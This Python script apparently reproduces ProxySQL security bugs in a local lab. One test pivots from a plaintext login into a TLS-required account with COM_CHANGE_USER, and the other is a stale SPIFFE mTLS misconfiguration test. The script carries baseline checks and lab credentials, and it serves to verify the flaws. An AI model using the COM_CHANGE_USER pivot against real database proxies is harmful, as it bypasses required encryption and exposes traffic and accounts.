import mysql.connector
from mysql.connector.errors import Error

HOST = "127.0.0.1"
PORT = 6033
ADMIN_PORT = 6032
DB = "appdb"


def print_proxysql_users(context_message):
    """Fetches and prints the current state of mysql_users from ProxySQL Admin."""
    print(f"\n[PROXYSQL INTERNAL STATE] {context_message}")
    try:
        admin_conn = mysql.connector.connect(
            host=HOST, port=ADMIN_PORT, user="radmin", password="radmin"
        )
        admin_cursor = admin_conn.cursor()
        admin_cursor.execute(
            "SELECT username, active, use_ssl, attributes FROM mysql_users"
        )
        rows = admin_cursor.fetchall()

        print(f"{'username':<15} | {'active':<6} | {'use_ssl':<7} | {'attributes'}")
        print("-" * 100)
        for row in rows:
            attr = row[3] if row[3] else "NULL"
            print(f"{row[0]:<15} | {row[1]:<6} | {row[2]:<7} | {attr}")
        print("-" * 100 + "\n")

        admin_conn.close()
    except Error as e:
        print(f"Failed to fetch ProxySQL state: {e}\n")


def print_conn_state(cursor, prefix="Connection State"):
    """Fetches and prints the current session identity and connection ID."""
    cursor.execute("SELECT USER(), CURRENT_USER(), CONNECTION_ID()")
    user, current_user, conn_id = cursor.fetchone()
    print(
        f"[{prefix}] Client User: {user:<20} | Auth Matched: {current_user:<15} | Conn ID: {conn_id}"
    )


def test_plaintext_to_ssl():
    print("=========================================================================")
    print("--- TEST 1: Plaintext Socket to SSL User (COM_CHANGE_USER Bypass) ---")
    print("=========================================================================")
    print(
        "[EXPLAIN] ProxySQL is configured to strictly require SSL for 'user_with_ssl'."
    )
    print(
        "[EXPLAIN] We will attempt to bypass this by logging in as a plaintext user first,"
    )
    print("[EXPLAIN] and then hijacking the unencrypted socket using COM_CHANGE_USER.")

    # 1A. Opportunistic TLS (The "False Positive" Bypass)
    print_proxysql_users("Before [1A] Opportunistic TLS Bypass Attempt")
    print(
        "[ACTION]  Connecting as 'user_no_ssl' but letting Python auto-negotiate TLS (Opportunistic TLS)..."
    )
    try:
        conn_opp = mysql.connector.connect(
            host=HOST,
            port=PORT,
            database=DB,
            user="user_no_ssl",
            password="pass_no_ssl",
            ssl_disabled=False,  # Let Python automatically negotiate TLS if available
        )
        cursor_opp = conn_opp.cursor()

        frontend_cipher = conn_opp._cipher if hasattr(conn_opp, "_cipher") else None

        if frontend_cipher:
            print(
                f"[RESULT]  Frontend Connection Cipher: {frontend_cipher} (The socket IS secretly encrypted!)"
            )
        else:
            print(
                f"[RESULT]  Frontend Connection Cipher: NONE (Python did NOT auto-upgrade to TLS)"
            )

        print("\n[ACTION]  Sending COM_CHANGE_USER to pivot into 'user_with_ssl'...")
        try:
            conn_opp.cmd_change_user("user_with_ssl", "pass_with_ssl", DB)
            print_conn_state(cursor_opp, "After Pivot    ")
            print(
                "[EXPLAIN] Pivot SUCCEEDED. However, we are not exactly sure if this can be called vulnerability."
            )
            print(
                "[EXPLAIN] Because Python auto-negotiated TLS, the socket was already encrypted."
            )
            print(
                "[EXPLAIN] ProxySQL checked the socket, saw TLS, and allowed the pivot. One thing is that ProxySQL didn't required the clients certs, which is a bit concerning."
            )
        except Error as e:
            print(f"[RESULT]  FAILED: {e}")
        conn_opp.close()
    except Error as e:
        print(f"Connection error: {e}")

    # 1B. Forced Plaintext (The True Bypass Attempt)
    print_proxysql_users("Before [1B] Forced Plaintext Bypass Attempt")
    print(
        "[ACTION]  Connecting as 'user_no_ssl' and FORCING a plaintext TCP connection (ssl_disabled=True)..."
    )
    try:
        conn_plain = mysql.connector.connect(
            host=HOST,
            port=PORT,
            database=DB,
            user="user_no_ssl",
            password="pass_no_ssl",
            ssl_disabled=True,  # Force a strict plaintext TCP socket
        )
        cursor_plain = conn_plain.cursor()

        frontend_cipher = (
            conn_plain._cipher if hasattr(conn_plain, "_cipher") else "NONE (Plaintext)"
        )

        print(
            f"[RESULT]  Frontend Connection Cipher: {frontend_cipher} (Confirmed 100% Plaintext)"
        )

        print(
            "\n[ACTION]  Sending COM_CHANGE_USER to pivot into 'user_with_ssl' on this plaintext socket..."
        )
        try:
            conn_plain.cmd_change_user("user_with_ssl", "pass_with_ssl", DB)
            print_conn_state(cursor_plain, "After Pivot    ")
            print("\n[VULN]    !!! BYPASS SUCCESSFUL !!!")
            print(
                "[VULN]    We are now operating as 'user_with_ssl', which is supposed to require TLS."
            )
            print(
                "[VULN]    Notice the 'Conn ID' is exactly the same. ProxySQL lazily reused the"
            )
            print("[VULN]    unencrypted socket without forcing a new TLS handshake.")
        except Error as e:
            print(f"\n[RESULT]  ProxySQL correctly BLOCKED the pivot: {e}")
            print(
                "[EXPLAIN] This version of ProxySQL has patched the COM_CHANGE_USER bypass."
            )
        conn_plain.close()
    except Error as e:
        print(f"Connection error: {e}")

    # 2. Baseline Failure: Direct connection without SSL
    print_proxysql_users("Before [2] Baseline Failure Check (Direct Plaintext)")
    print(
        "[EXPLAIN] To prove the proxy rules actually work, we will try to connect directly"
    )
    print("[EXPLAIN] to 'user_with_ssl' over plaintext without doing the pivot trick.")
    print("\n[ACTION]  Attempting direct plaintext connection to 'user_with_ssl'...")
    try:
        conn = mysql.connector.connect(
            host=HOST,
            port=PORT,
            database=DB,
            user="user_with_ssl",
            password="pass_with_ssl",
            ssl_disabled=True,
        )
        print(
            "[FAIL]    Connection succeeded without SSL, but ProxySQL should have blocked it!"
        )
        conn.close()
    except Error as e:
        print(
            f"[RESULT]  ProxySQL blocked direct plaintext connection as expected: {e}"
        )

    # 3. Happy Path: Direct connection with SSL + Certs
    print_proxysql_users("Before [3] Happy Path Check (Strict SSL + Certs)")
    print(
        "[EXPLAIN] Finally, we will connect properly using TLS to show the baseline works."
    )
    print("\n[ACTION]  Attempting secure connection to 'user_with_ssl' with TLS...")
    try:
        conn_ssl = mysql.connector.connect(
            host=HOST,
            port=PORT,
            database=DB,
            user="user_with_ssl",
            password="pass_with_ssl",
            ssl_ca="certs/ca.pem",
            ssl_cert="certs/client-standard-cert.pem",
            ssl_key="certs/client-standard-key.pem",
            ssl_disabled=False,
        )
        print("[RESULT]  SUCCESS: Connected securely to 'user_with_ssl' over TLS!")
        print_conn_state(conn_ssl.cursor(), "Secure Session ")
        conn_ssl.close()
    except Error as e:
        print(f"[FAIL]    Happy Path Issue: {e}")


def test_half_mtls_state():
    print("\n=========================================================================")
    print("--- TEST 2: Half-mTLS State (Stale SPIFFE Rule) ---")
    print("=========================================================================")
    print(
        "[EXPLAIN] ProxySQL correctly enforces SPIFFE client certificates for 'spiffe_user'."
    )
    print(
        "[EXPLAIN] We will prove that if an admin turns off 'use_ssl' but forgets to clear"
    )
    print(
        "[EXPLAIN] the SPIFFE identity, the user gets stuck in a broken 'Half-mTLS' state."
    )

    # 1. Happy Path Check (Strict SSL + SPIFFE Client Certs)
    print_proxysql_users("Before SPIFFE Happy Path")
    print(
        "[ACTION]  Connecting as 'spiffe_user' using a valid SPIFFE Client Certificate..."
    )
    try:
        happy_conn = mysql.connector.connect(
            host=HOST,
            port=PORT,
            database=DB,
            user="spiffe_user",
            password="spiffe_password",
            ssl_ca="certs/ca.pem",
            ssl_cert="certs/client-spiffe-cert.pem",
            ssl_key="certs/client-spiffe-key.pem",
            ssl_disabled=False,
        )
        print(
            "[RESULT]  SUCCESS: Happy path connected securely. ProxySQL validated the SPIFFE ID!"
        )
        print_conn_state(happy_conn.cursor(), "Secure Session ")
        happy_conn.close()
    except Error as e:
        print(f"[FAIL]    Happy Path Issue: {e}")
        print("[EXPLAIN] Stopping test: Cannot verify the bug if the happy path fails.")
        return

    # 2. Simulate the accidental misconfiguration
    try:
        admin_conn = mysql.connector.connect(
            host=HOST, port=ADMIN_PORT, user="radmin", password="radmin"
        )
        admin_cursor = admin_conn.cursor()
        print(
            "\n[ACTION]  Admin is disabling 'use_ssl' for 'spiffe_user', but leaving the SPIFFE rule active..."
        )
        admin_cursor.execute(
            "UPDATE mysql_users SET use_ssl=0 WHERE username='spiffe_user'"
        )
        admin_cursor.execute("LOAD MYSQL USERS TO RUNTIME")
        admin_conn.close()
    except Error as e:
        print(f"[FAIL]    Admin connection error: {e}")
        return

    # 3. Test for the Bug (Attempt connection without SSL)
    print_proxysql_users("After Admin disabled SSL for spiffe_user (Testing the Bug)")
    print("[EXPLAIN] Because use_ssl=0, we expect to be able to log in over plaintext.")
    print(
        "\n[ACTION]  Attempting to connect as 'spiffe_user' over a PLAINTEXT socket..."
    )
    try:
        # We enforce a plaintext connection by passing ssl_disabled=True
        conn = mysql.connector.connect(
            host=HOST,
            port=PORT,
            database=DB,
            user="spiffe_user",
            password="spiffe_password",
            ssl_disabled=True,
        )
        print(
            "[FAIL]    Connection established without SSL. (The bug is fixed in this version!)"
        )
        print_conn_state(conn.cursor(), "Plaintext Sess ")
        conn.close()
    except Error as e:
        print(f"\n[RESULT]  Connection blocked by ProxySQL: {e}")
        if "Access denied" in str(e):
            print("[VULN]    !!! HALF-mTLS BUG CONFIRMED !!!")
            print(
                "[VULN]    We received a generic 'Access denied' error. Even though use_ssl=0,"
            )
            print(
                "[VULN]    ProxySQL is trying to extract a SPIFFE ID from a plaintext connection."
            )
            print(
                "[VULN]    This misleads administrators into thinking the MySQL password is wrong."
            )
    # 4. Revert for next iteration
    try:
        admin_conn = mysql.connector.connect(
            host=HOST, port=ADMIN_PORT, user="radmin", password="radmin"
        )
        admin_cursor = admin_conn.cursor()
        print("\n[ACTION]  Admin is enabling 'use_ssl' for 'spiffe_user'")
        admin_cursor.execute(
            "UPDATE mysql_users SET use_ssl=1 WHERE username='spiffe_user'"
        )
        admin_cursor.execute("LOAD MYSQL USERS TO RUNTIME")
        admin_conn.close()
    except Error as e:
        print(f"[FAIL]    Admin connection error: {e}")
        return


if __name__ == "__main__":
    test_plaintext_to_ssl()
    test_half_mtls_state()
